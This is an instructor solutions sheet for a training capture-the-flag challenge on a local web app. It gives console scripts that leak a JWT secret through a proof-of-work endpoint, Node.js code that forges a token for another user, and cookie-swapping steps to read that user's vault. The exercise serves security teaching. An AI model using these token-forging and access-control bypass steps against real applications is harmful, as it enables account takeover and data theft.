# CTF 2 -- Solutions

> **Instructors/markers only.** Do not distribute to participants.

---

## Credentials

- See `credentials.json` for generated per-user passwords.
- Usernames follow the `abcd12` format (4 letters + 2 digits).
- Generate credentials with: `cd CTFs/challenge-generation && node chgen_ctf2.js abcd12 efgh34`

---

## Flag Location

Each user's flag is stored in the vault of a **bot user** named `<username>-vault`. For example, the flag for `abcd12` is in the vault of `abcd12-vault`. The bot user has an unguessable password and cannot be logged into directly. The flag is only accessible by forging a JWT for the bot user.

Flag format: `durham-pm{<token>_<username>}`

---

## Solution Walkthrough

### Stage 1 -- Obtain the JWT secret via Proof-of-Work

1. Log in as your user (e.g., `abcd12` with the password from `credentials.json`).
2. Navigate to `/app/challenge`.

**Option A -- fully automatic (console only)**

Open DevTools console (F12) and paste this. It fetches the nonce, finds the suffix, submits it, and prints the secret:

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const {nonce,difficulty} = await fetch('/api/challenge').then(r=>r.json());
  console.log('nonce:',nonce,'difficulty:',difficulty);
  let i=0;
  while(true){
    const suffix=i.toString(36);
    const h=await sha256hex(nonce+suffix);
    if(h.startsWith('0'.repeat(difficulty))){
      console.log('Found suffix:',suffix,'hash:',h);
      const res=await fetch('/api/challenge/solve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce,suffix}),credentials:'include'}).then(r=>r.json());
      console.log('JWT SECRET:',res.secret);
      break;
    }
    i++;
  }
})();
```

The secret prints as **`JWT SECRET: dev-secret-change-me`**. Copy it for Stage 2.

**Option B -- use the challenge page submit box**

1. On `/app/challenge`, copy the nonce shown under "Nonce:".
2. Open DevTools console (F12). Paste the block below, replacing `PASTE_NONCE_HERE` with your nonce:

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const nonce='PASTE_NONCE_HERE';
  let i=0;
  while(true){const suffix=i.toString(36);const h=await sha256hex(nonce+suffix);if(h.startsWith('0000')){console.log('TYPE THIS INTO THE BOX:',suffix);break;}i++;}
})();
```

3. The console outputs a short string (e.g., `f5p`). Type only that suffix into the input field.
4. Click **Submit** -- the page shows `Solved! Secret: dev-secret-change-me`.

### Stage 2 -- Discover the target user

1. Navigate to `/app/teams` or call `GET /api/teams/users`.
2. The user list includes bot users with the `-vault` suffix (e.g., `abcd12-vault`).
3. Your flag is stored in your corresponding bot user's vault.

### Stage 3 -- Forge a JWT and steal the flag

1. Using the secret from Stage 1, forge a JWT for your bot user:

```js
// Node.js
const jwt = require('jsonwebtoken')
const token = jwt.sign({ sub: 'abcd12-vault' }, 'dev-secret-change-me', { expiresIn: '7d' })
console.log(token)
```

Or use [jwt.io](https://jwt.io) -- paste the secret, set payload `{ "sub": "abcd12-vault" }`.

2. In your browser DevTools, go to Application > Cookies > `localhost` -- replace the `session` cookie value with the forged token.
3. Navigate to `/app/vault` -- the bot user's vault contains the flag entry.

**Flag:** `durham-pm{..._abcd12}` *(per-user, see flags.json)*

---

## Vulnerabilities Exploited

| Vulnerability | Location | Description |
|---------------|----------|-------------|
| JWT secret disclosure | `POST /api/challenge/solve` | Server returns `JWT_SECRET` as the PoW reward |
| Weak JWT secret | `.env` / `server/index.js` | Secret is short and predictable (`dev-secret-change-me`) |
| IDOR | `GET /api/vault` | Vault is scoped to the JWT `sub` claim -- forging it allows accessing any user's vault |

---

## Reset

```bash
docker compose down -v && docker compose up --build
```

This wipes `server/data/` and reseeds from the mounted `flags.json` and `credentials.json`.
